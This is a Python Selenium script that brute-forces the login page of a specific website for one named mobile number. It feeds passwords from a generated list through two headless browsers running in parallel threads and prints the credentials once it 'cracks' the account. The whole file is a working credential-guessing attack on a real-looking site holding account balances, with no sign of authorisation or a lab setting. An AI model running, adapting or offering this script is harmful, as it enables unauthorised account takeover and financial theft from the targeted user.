#get passwords from password-combination-generator.py and password_combinations.txt

import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, TimeoutException, NoSuchWindowException
import threading
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


login_url = "https://www.longapp-rd.com/index/user/login.html"  # Login page URL
profile_url = "https://www.longapp-rd.com/index/my/index.html"  # Profile page URL
app_login_mobile = "tel"
app_login_password = "pwd"
app_login_button = "login"
balance_attribute = "//div[contains(text(), 'Balance')]"
income_attribute = "//div[contains(text(), 'Balance')]/following-sibling::div[2]"
'''
<div>
<div style="">Balance<br>0.00</div>
<div style=""> Recharge<br>50.00</div>
<div style=""> Income<br>0</div>
</div>
'''
mobile = "7562879235"
file_path_to_read = "common-codes/password_combinations.txt"
passwords = []
try:
    with open(file_path_to_read, 'r') as file:
        for line in file:
            line = line.strip()  
            if line:  
                passwords.append(line)
except FileNotFoundError:
    print(f"File {file_path_to_read} not found.")
# Combine mobile and passwords into a list of credentials
credentials = [(mobile, password) for password in passwords]



def get_profile(browser_name, credentials):
    # Define the options for headless mode
    if browser_name == "Chrome":
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        driver = webdriver.Chrome(options=options)
    else:
        options = webdriver.EdgeOptions()
        options.add_argument('--headless')
        driver = webdriver.Edge(options=options)
    wait = WebDriverWait(driver, 10)

    driver.get(login_url)
    for mobile, password in credentials:
        try:
            startpage = driver.current_url
            print(f"{mobile} is trying to login...")
            username_field = wait.until(EC.presence_of_element_located((By.NAME, app_login_mobile)))
            password_field = driver.find_element(By.NAME, app_login_password)
            username_field.clear()
            password_field.clear()
            username_field.send_keys(mobile)
            password_field.send_keys(password)
            login_button = driver.find_element(By.CLASS_NAME, app_login_button)
            login_button.click()

            for _ in range(6):  # loop till we login
                if driver.current_url != startpage:
                    break
                time.sleep(0.5)
            if driver.current_url == startpage:
                # Cannot Login ! 
                print(f"Failed password: {password}!")
            else:
                print("Sucessfully Cracked the password!")
                print(f"Mobile: {mobile} and Password: {password}")
                exit()

        except NoSuchElementException:
            print(f"Element not found!. Check your element for variables in the HTML code using attribute-checker.py")
        except TimeoutException:
            print(f"Timed out while waiting to load for {mobile}.")
        except NoSuchWindowException:
            print(f"The browser window was closed unexpectedly for {mobile}.")
        except Exception:
            print(f"An unexpected error occurred for {mobile}")
    driver.quit()

def split_credentials(credentials):
    mid = len(credentials) // 2
    return credentials[:mid], credentials[mid:]


if __name__ == '__main__':
    # process: get the withdraw/balance amount 
    chrome_credentials, edge_credentials = split_credentials(credentials)
    # Create two threads for Chrome and Edge browsers for get_profile
    chrome_thread = threading.Thread(target=get_profile, args=("Chrome", chrome_credentials))
    edge_thread = threading.Thread(target=get_profile, args=("Edge", edge_credentials))
    # Start both threads
    chrome_thread.start()
    edge_thread.start()
    # Wait for both threads to finish
    chrome_thread.join()
    edge_thread.join()